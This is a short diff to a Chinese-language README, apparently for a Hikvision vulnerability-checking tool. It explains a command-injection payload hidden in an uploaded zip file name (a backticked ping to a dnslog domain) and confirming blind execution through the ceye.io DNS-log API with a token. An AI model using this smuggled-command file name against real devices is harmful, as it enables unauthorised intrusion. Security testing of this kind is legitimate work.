@@ -242,9 +242,7 @@ Content-Type: application/zip
 "`ping xxx.dnslog.cn`.zip"
 我们可以用本地的压缩包，要特别注意写法
 那么本地就准备一个zip
-内置一个dnslog(请勿修改）
-如sdadsad.dnslog.cn
-
+内置了一个dnslog(请勿修改）
 然后这样要做精准判断的话
 就是读取自定义的dns信息，随机叠加+自定义信息
 正确写法：
@@ -255,6 +253,9 @@ Content-Type: application/zip
      String filepath1 = randomNumber + "." + filePath;  叠加后的数据
    filepath1 = textBox5.Text; 传给一个控件
   request.Headers.Add("Token", token);加载读到的token
+  
+  ![image](https://github.com/MInggongK/Hikvision-/blob/main/dgf.png)
+  
   验证的话， 还是采用http://api.ceye.io/v1/records?token=去验证
    http://api.ceye.io/v1/records?token=+"token信息";
    采用了自定义dnslog
